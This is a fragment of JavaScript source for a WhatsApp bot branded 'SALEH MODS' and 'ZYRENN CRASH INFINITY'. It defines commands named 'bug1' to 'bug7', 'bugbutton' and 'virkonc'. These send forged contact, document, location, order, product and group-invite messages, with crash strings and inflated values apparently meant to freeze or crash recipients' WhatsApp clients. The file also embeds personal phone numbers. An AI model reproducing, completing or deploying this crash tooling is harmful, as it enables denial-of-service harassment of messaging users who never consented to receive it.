...
"participant": "62895321048731@s.whatsapp.net"
	}}}}	
//=================================================//	
const kal = { 
key: {
...
"documentMessage": {
							...
							"fileName": `ꪶ𝑺𝑨𝑳𝑬𝑯 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ${ngazap(prefix)}`,
...
//=================================================//
const bangkal= (teks) => {
haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`,"body": `🔥🔥🔥 ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://youtube.com/c/TheZyrenn`}}}, { quoted: hw })
} 
//=================================================//
// Kontak
...
const bacito = (jid, text, quoted = fkontak) => haikal.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `ꪶ𝑺𝑨𝑳𝑬𝑯 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./lib/pict.jpg'), sourceUrl: `https://youtube.com/c/TheZyrenn` }}}, { quoted })
//=================================================//
//GCLINK
...
const bacit = (jid, text, quoted = fgclink) => haikal.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `ꪶ𝑺𝑨𝑳𝑬𝑯 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ𝐘 ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./lib/pict.jpg'), sourceUrl: `https://youtube.com/c/TheZyrenn` }}}, { quoted })
//=================================================//
//Document
const fdoc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
const bacot = (jid, text, quoted = fdoc) => haikal.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `ꪶ𝑺𝑨𝑳𝑬𝑯 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./lib/pict.jpg'), sourceUrl: `https://youtube.com/c/TheZyrenn` }}}, { quoted })
//=================================================//
// VN 
...
const hwbro = (jid, text, quoted = fvn) => haikal.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `ꪶ𝑺𝑨𝑳𝑬𝑯 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./lib/pict.jpg'), sourceUrl: `https://youtube.com/c/TheZyrenn` }}}, { quoted })
//=================================================//
//Lokasi
const floc = {key : {participant : '0@s.whatsapp.net'},message: {locationMessage: {name: `${ownername}`,jpegThumbnail: thumb}}}
const hwmods = (jid, text, quoted = floc) => haikal.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `ꪶ𝑺𝑨𝑳𝑬𝑯 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./lib/pict.jpg'), sourceUrl: `https://youtube.com/c/TheZyrenn` }}}, { quoted })
//=================================================//
//Troli
...
const review = (jid, text, quoted = ftroli) => haikal.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `ꪶ𝑺𝑨𝑳𝑬𝑯 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./lib/pict.jpg'), sourceUrl: `https://youtube.com/c/TheZyrenn` }}}, { quoted })
//=================================================//
//image
...
const reply = (jid, text, quoted = cayalog) => haikal.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `ꪶ𝑺𝑨𝑳𝑬𝑯 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./lib/pict.jpg'), sourceUrl: `https://youtube.com/c/TheZyrenn` }}}, { quoted })
...
totalAmount1000: "500000000000000",
totalCurrencyCode: "IDR",
orderTitle: `ꪶ𝑺𝑨𝑳𝑬𝑯 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ ${ngazap(prefix)}`,
...
"firstImageId": 1,
"retailerId": `ꪶ𝑺𝑨𝑳𝑬𝑯 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ`,
"url": "wa.me/62895321048731"
},
"businessOwnerJid": "62895321048731@s.whatsapp.net",
}
...
"productImage": messa.imageMessage,
"productId": "4383282311765462",
"title": `ꪶ𝑺𝑨𝑳𝑬𝑯 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ${ngazap(prefix)}`,
"description": `ꪶ𝑺𝑨𝑳𝑬𝑯 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ`,
"currencyCode": "IDR",
"footerText": `ꪶ𝑺𝑨𝑳𝑬𝑯 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ`,
...
adehvn = { 
        ...
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `ꪶ𝑺𝑨𝑳𝑬𝑯 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ${ngazap(prefix)}`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
...
haikal.sendMessage(Pe, {text: "ꪶ𝑺𝑨𝑳𝑬𝑯 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ"}, {quoted: a})
await sleep(10000)
...
user.afkReason = text
bangkal(`${m.pushName} ꪶ𝑺𝑨𝑳𝑬𝑯 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ${text ? ': ' + text : ''}`)
}
break
//=================================================//
case 'bug1': {
...
reply(m.chat, `ꪶ𝑺𝑨𝑳𝑬𝑯 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ`, main)
}
break
//=================================================//
case 'bug2': {
...
hwmods(m.chat, `ꪶ𝑺𝑨𝑳𝑬𝑯 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ`, main)
}
break
//=================================================//
case 'bug3': {
...
review(m.chat, `ꪶ𝑺𝑨𝑳𝑬𝑯 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ`, main)
}
break
//=================================================//
case 'bug4': {
...
hwbro(m.chat, `ꪶ𝑺𝑨𝑳𝑬𝑯 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ`, main)
}
break
//=================================================//
case 'bug5': {
...
"inviteExpiration": ` ꪶ𝑺𝑨𝑳𝑬𝑯 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ`,
"groupName": `ꪶ𝑺𝑨𝑳𝑬𝑯 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ ${ngazap(prefix)}`,
"caption": `ꪶ𝑺𝑨𝑳𝑬𝑯 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ`
 }
   }
}
bacit(m.chat, `ꪶ𝑺𝑨𝑳𝑬𝑯 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ`, main)
}
break
//=================================================//
case 'bug6': {
...
bacito(m.chat, `ꪶ𝑺𝑨𝑳𝑬𝑯 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ`, main)
}
break
//=================================================//
case 'bug7': {
...
bacot(m.chat, `ꪶ𝑺𝑨𝑳𝑬𝑯 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ`, main)
}
break
//=================================================//
case 'bugbutton': 
if (!isCreator) return
  const buttons = [
  {buttonId: `${prefix}ꪶ𝑺𝑨𝑳𝑬𝑯 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ`, buttonText: {displayText: cttl}, type: 1},
  {buttonId: 'ꪶ𝑺𝑨𝑳𝑬𝑯 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ', buttonText: {displayText: buttonvirus}, type: 1},
  {buttonId: 'ꪶ𝑺𝑨𝑳𝑬𝑯 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ', buttonText: {displayText: ngazap}, type: 1}
]
...
break
case 'virkonc': {
           const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `ꪶ𝑺𝑨𝑳𝑬𝑯 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:ꪶ𝑺𝑨𝑳𝑬𝑯 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ\nitem1.TEL;waid=6281991410940:6281991410940\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}                          		
...
//=================================================//
case 'sc': {
bangkal('My Chenell : https://youtube.com/c/TheZyrenn')
}
break
//=================================================//
case 'chat': {
...
urlButton: {
displayText: 'Sc Bot',
url: 'https://youtube.com/c/TheZyrenn'
}
}, {
callButton: {
displayText: 'Number Phone Owner',
phoneNumber: '+62895321048731'
}
}, {
quickReplyButton: {
...
phoneNumber: 'wa.me/+62895321048731'
}
}, {
quickReplyButton: {
displayText: 'Status Bot',
